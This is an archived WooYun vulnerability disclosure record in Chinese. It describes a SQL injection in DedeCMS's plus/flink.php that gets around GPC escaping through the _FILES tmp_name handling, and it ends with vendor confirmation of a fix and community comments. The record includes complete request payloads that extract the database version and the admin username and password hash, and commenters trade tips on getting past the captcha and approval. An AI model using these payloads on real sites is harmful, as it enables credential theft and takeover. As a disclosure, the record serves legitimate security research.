{"id": 4059, "wybug_id": "wooyun-2014-051950", "wybug_title": "DedeCMS全版本通杀SQL注入(真正的无任何限制附官方测试结果)", "wybug_corp": "Dedecms", "wybug_author": "kobin97", "wybug_date": "2014-02-25 10:35", "wybug_open_date": "2014-05-26 10:36", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["字符类型注射", "注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-02-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-02-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-02-28：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-26：\t细节向公众公开  简要描述： 最近很多人刷dedecms的漏洞，个人表示很无语。粗略看了下,这些洞存在太大限制 一句话总结：只要会员中心一关，全部没法用...试问现在哪个傻子会开会员中心... 默认都是关闭的,所以哪...今天这个洞，无视会员中心，无视GPC，会员中心，GPC你哪凉快 哪呆着去，默认安装就能利用哦...也一句话总结：架构问题才是真问题。（ps:调皮一下^-^，felixk3y某见怪，话说这个漏洞跨越了多个版本，不知会不会打雷。） 详细说明：  首先，我们来看看dede重要文件 common.inc.php这里开始过滤得很完整，往下看//转换上传的文件相关的变量及安全处理、并引用前台通用的上传函数\nif($_FILES){    require_once(DEDEINC.'/uploadsafe.inc.php');}\n我看再看：uploadsafe.inc.php\n//29行    $$_key = $_FILES[$_key]['tmp_name'] = str_replace(\"\\\\\\\\\", \"\\\\\", $_FILES[$_key]['tmp_name']);\n看到这里，我笑了。这不是能绕过 GPC的节奏么。好吧，随便找一个能添加数据的地方于是找到了plus\\flink.php虽然都经过 htmlspecialchars 我们看看：htmlspecialchars(string,quotestyle,character-set) 可选。规定如何编码单引号和双引号。    ENT_COMPAT - 默认。仅编码双引号。    ENT_QUOTES - 编码双引号和单引号。    ENT_NOQUOTES - 不编码任何引号。默认情况下仅编码双引号。这里不是重点，不过也是能利用的条件之一，用于绕过dede自带的ids。构造webname 值为：\n&_FILES[webname][name]=1.gif&_FILES[webname][type]=image/gifx&_FILES[webname][size]=10&&_FILES[webname][tmp_name]=pass\\\n这里解释一下，经过GPC后 webname 变为 pass\\\\经过刚才 uploadsafe.inc.php 的函数后 webname 变为 pass\\插入到SQL语句中就变成了\nINSERT INTO `#@__flink`(sortrank,url,webname,logo,msg,email,typeid,dtime,ischeck) VALUES('50','http://','pass\\','\n即吃掉了后面的 ' ，从而实现绕过GPC。不过ExecuteNoneQuery不支持错误回显，那我们就构造好，让他显示出来吧。于是后面的logo函数就变成：logo=,if(@`'`,0x7c,(select version())),1,1,1,1,1)#,@`'`ischeck 为1即绕过审核，结果直接显示出来。完整参数为：查版本：\nSubmit=%20%E6%8F%90%20%E4%BA%A4%20&dopost=save&email=&logo=,if(@`'`,0x7c,(select version())),1,1,1,1,1)#,@`'`&typeid=1&url=http%3A%2F%2F&validate=spen&_FILES[webname][name]=1.gif&_FILES[webname][type]=image/gifx&_FILES[webname][size]=10&&_FILES[webname][tmp_name]=pass\\\n查密码：\nSubmit=%20%E6%8F%90%20%E4%BA%A4%20&dopost=save&email=&logo=,if(@`'`,0x7c,(select concat(userid,0x7c,pwd) from dede_admin limit 0,1)),1,1,1,1,1)#,@`'`&typeid=1&url=http%3A%2F%2F&validate=spen&_FILES[webname][name]=1.gif&_FILES[webname][type]=image/gifx&_FILES[webname][size]=10&&_FILES[webname][tmp_name]=pass\\\n验证码字段自己修改。。。   漏洞证明：  \n\n\n\n官方测试地址：http://help.dedecms.com/plus/flink.php\n\n   修复方案：  调整架构！   版权声明：转载请注明来源 kobin97@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-02-25 13:10 厂商回复： 已经修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-02-25 10:36 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  调皮，我以为重复的呢。。。    \n     2014-02-25 10:40 |    \t\t我了个去 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:14        | 4892057@qq.com                          ...)\t\t \n  火钳刘明，此贴必火，立字为证。    \n     2014-02-25 10:40 |    \t\tHackBraid  \t\t\t( 核心白帽子 |\t\t\t        Rank:1545 漏洞数:260        | ...........................................)\t\t \n  真正的无任何限制。。。    \n     2014-02-25 10:40 |    \t\t老胖子 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        )\t\t \n  老夫夜观天象，此贴必火.      \n     2014-02-25 10:40 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  前排买摔炮------妞x    \n     2014-02-25 10:41 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  搞毛    \n     2014-02-25 10:42 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  @kobin97 私下交流交流?    \n     2014-02-25 10:46 |    \t\ttnt1200 \t\t\t( 普通白帽子  |\t\t\t        Rank:121 漏洞数:17        | 关注飞机安全....)\t\t \n  火钳刘明    \n     2014-02-25 10:51 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  确实牛B    \n     2014-02-25 10:53 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  dede••••  马蹄声。马年必然马不停蹄。。。    \n     2014-02-25 10:55 |    \t\t宇少 \t\t\t( 普通白帽子  |\t\t\t        Rank:106 漏洞数:41        | Jyhack-TeaM：bbs.jyhack.com 群:308694453...)\t\t \n  简直就是刁炸天    \n     2014-02-25 10:56 |    \t\tKavia \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:10        )\t\t \n  看了楼上的回复，顿时觉得该关注一发。洞主2000又到手了，恭喜恭喜！    \n     2014-02-25 11:51 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  你们，哈哈。都火了    \n     2014-02-25 12:38 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  我靠，这下热闹了    \n     2014-02-25 12:47 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  霸气十足啊。    \n     2014-02-25 12:48 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  我去，私藏多年的0day啊    \n     2014-02-25 12:55 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  我去，私藏多年的0day啊    \n     2014-02-25 13:41 |    \t\tkimdle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | @kimdle)\t\t \n  我去，私藏多年的0day啊    \n     2014-02-25 14:00 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  8分    \n     2014-02-25 14:10 |    \t\t0xTback \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 初入江湖，请多多关照~！！！)\t\t \n  这洞能卖不少钱吧    \n     2014-02-25 14:13 |    \t\tt00000by57 \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:5        | Access Denied.)\t\t \n  看了下补丁 感觉是解码那儿的问题？    \n     2014-02-25 14:23 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  我去，私藏多年的0day啊    \n     2014-02-25 14:28 |    \t\tMetasploit \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:7        | http://www.metasploit.cn/)\t\t \n  很黄很暴力    \n     2014-02-25 15:19 |    \t\tWalle \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:5        | ...   位卑、未敢忘忧国！   ...)\t\t \n  我去，私藏多年的0day啊     \n     2014-02-25 15:22 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:413 漏洞数:62        | 到我嘴里来)\t\t \n  无限制，简直吊    \n     2014-02-25 15:38 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  果然被劈了，好屌！    \n     2014-02-25 15:51 |    \t\tC4nf3ng \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:5        )\t\t \n  我去，私藏多年的0day啊    \n     2014-02-25 16:07 |    \t\tmsx2009 \t\t\t( 路人 |\t\t\t        Rank:5 漏洞数:7        | 信息安全 web开发)\t\t \n  我看出来，利用时间有点长吧，呵呵    \n     2014-02-25 18:23 |    \t\tRise \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 初学者)\t\t \n  感觉很叼的样子！    \n     2014-02-25 22:50 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-02-27 12:08 |    \t\t哦哦 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 好123，最好的导航，没有之一)\t\t \n  我去，私藏多年的0day啊    \n     2014-02-28 17:57 |    \t\tI am XiaoM \t\t\t( 路人 |\t\t\t        Rank:3 漏洞数:4        | 看着大家的Rank我深深被伤了...)\t\t \n  钳刘明    \n     2014-03-01 19:51 |    \t\tjeffreys125 \t\t\t( 实习白帽子  |\t\t\t        Rank:63 漏洞数:14        | 懒人。。)\t\t \n  mark    \n     2014-03-11 15:59 |    \t\tQQ852451559 \t\t\t( 实习白帽子  |\t\t\t        Rank:79 漏洞数:18        | 学生党)\t\t \n  mark    \n     2014-04-16 19:17 |    \t\twooyunmibu \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 嗯嗯嗯)\t\t \n  此贴必火啊    \n     2014-04-16 20:30 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1008 漏洞数:91        | 梦想还是要有的，万一实现了呢？)\t\t \n  请问验证码那边怎么写？总是利用不成功    \n     2014-04-16 21:14 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1008 漏洞数:91        | 梦想还是要有的，万一实现了呢？)\t\t \n  验证码搞定了，可是怎么都要审核，是不是直接加上ischeck=1这个参数就好？    \n     2014-04-16 22:04 |    \t\tkobin97  \t\t\t( 核心白帽子 |\t\t\t        Rank:1754 漏洞数:190        | 关注网络安全。。)\t\t \n  @if、so 对的    \n     2014-04-16 22:05 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1008 漏洞数:91        | 梦想还是要有的，万一实现了呢？)\t\t \n  @kobin97 我加了，还是提示需要管理审核    \n     2014-04-16 22:06 |    \t\tkobin97  \t\t\t( 核心白帽子 |\t\t\t        Rank:1754 漏洞数:190        | 关注网络安全。。)\t\t \n  @if、so 那是不是修复了？    \n     2014-04-16 22:07 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1008 漏洞数:91        | 梦想还是要有的，万一实现了呢？)\t\t \n  @kobin97 对。。我测试那个站，没有一个漏洞可以利用。    \n     2014-04-16 22:08 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1008 漏洞数:91        | 梦想还是要有的，万一实现了呢？)\t\t \n  @kobin97 可以加个QQ交流交流技术么    \n     2014-05-09 15:02 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @kobin97 我测试过一些老站点，发现很多都不会在flink.php中显示添加的链接~有点郁闷~    \n     2014-05-17 14:56 |    \t\tB1acken \t\t\t( 普通白帽子  |\t\t\t        Rank:174 漏洞数:56        | 渣渣)\t\t \n  我去，私藏多年的0day啊    \n     2014-05-26 11:35 |    \t\txiaokinghk \t\t\t( 实习白帽子  |\t\t\t        Rank:82 漏洞数:16        | 【DBA】)\t\t \n  @if、so 验证码如何搞定？    \n     2014-05-26 14:21 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  屌炸天，mark    \n     2014-05-26 15:54 |    \t\tJasonfcku \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:2        | 小白一只，求不社。)\t\t \n  我怎么感觉我老早在哪里见过？。。这是幻觉吗？@u神 要通过审核才行    \n     2014-06-04 22:10 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:37        )\t\t \n  @kobin97 怎么老是验证码错误。。怎么改？？    \n     2014-06-05 17:33 |    \t\t炊烟 \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:44        | 每一天都需要努力。)\t\t \n  @kobin97 审核过不了啊。。    \n     2014-06-05 21:32 |    \t\t炊烟 \t\t\t( 普通白帽子  |\t\t\t        Rank:238 漏洞数:44        | 每一天都需要努力。)\t\t \n  @kobin97 版本11年的- -    \n     2014-06-06 21:02 |    \t\t帅爆的小烬烬 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:25        | 路上有个漂亮妹子和我搭讪，知道我赶着去挖...)\t\t \n  如何搞定验证码？    \n     2014-06-06 23:14 |    \t\tkobin97  \t\t\t( 核心白帽子 |\t\t\t        Rank:1754 漏洞数:190        | 关注网络安全。。)\t\t \n  @xiaokinghk @好基友一辈子 @帅爆的小烬烬 验证码可以直接打开验证码的链接，然后输入就行了呀。。。    \n     2014-06-07 11:26 |    \t\t帅爆的小烬烬 \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:25        | 路上有个漂亮妹子和我搭讪，知道我赶着去挖...)\t\t \n  @kobin97 我去，“验证码字段自己修改”这句漏过去了哈哈，多谢了    \n     2014-06-08 09:04 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:37        )\t\t \n  @kobin97 在哪里写验证码啊，你的payload里没有把    \n     2014-09-10 10:46 |    \t\tpigzhu \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:4        | 网络共享！)\t\t \n  需要审核  好像限制了    \n     2015-04-15 13:07 |    \t\tj2ck3r \t\t\t( 普通白帽子  |\t\t\t        Rank:406 漏洞数:92        | 别关注我，跟你不熟。)\t\t \n  需要审核    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}